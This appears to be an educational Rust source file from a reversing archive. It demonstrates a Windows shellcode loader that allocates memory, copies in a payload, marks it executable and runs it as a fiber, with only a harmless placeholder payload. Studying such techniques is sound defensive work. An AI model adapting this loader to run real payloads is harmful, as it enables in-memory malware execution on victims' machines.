/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new fiber

Compile:
    $ cargo build

Technique:
    - allocation:   VirtualAlloc
    - writing:      RtlMoveMemory
    - permission:   VirtualProtect
    - execution:    CreateFiber
*/

use std::{mem, process, ptr};
use winapi::um::{
    memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect},
    winbase::{
        LPFIBER_START_ROUTINE,
        ConvertThreadToFiber, CreateFiber, 
        DeleteFiber, SwitchToFiber,
    },
    winnt::{
        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, 
        PAGE_READWRITE, PAGE_EXECUTE_READ
    },
};

type DWORD = u32;

fn main() {
    // shellcode storage in stack
    let payload: [u8; 4] = [0x90, 0x90, 0xCC, 0xC3];
    let mut old_protect: DWORD = PAGE_READWRITE;
    
    unsafe {
        // allocate memory buffer for payload as READ-WRITE (no executable)
        let runtime = VirtualAlloc(
            ptr::null_mut(),
            payload.len().try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if runtime.is_null() {
            println!("[-] unable to allocate");
            process::exit(1);
        }

        // copy payload to the buffer
        std::ptr::copy(payload.as_ptr(), runtime.cast(), payload.len());

        // make buffer executable (R-X)
        let retval = VirtualProtect (
            runtime,
            payload.len() as usize,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if retval != 0 {
            let ep: LPFIBER_START_ROUTINE = mem::transmute(runtime);

            // convert main thread to fiber, to allow scheduling other fibers
            ConvertThreadToFiber(ptr::null_mut());

            // create fiber for shellcode and switch to it
            let fiber = CreateFiber(0, ep, ptr::null_mut());
            SwitchToFiber(fiber);

            // delete the fiber after execution end
            DeleteFiber(fiber);
        }

        VirtualFree(runtime, payload.len(), MEM_RELEASE);
    }
}
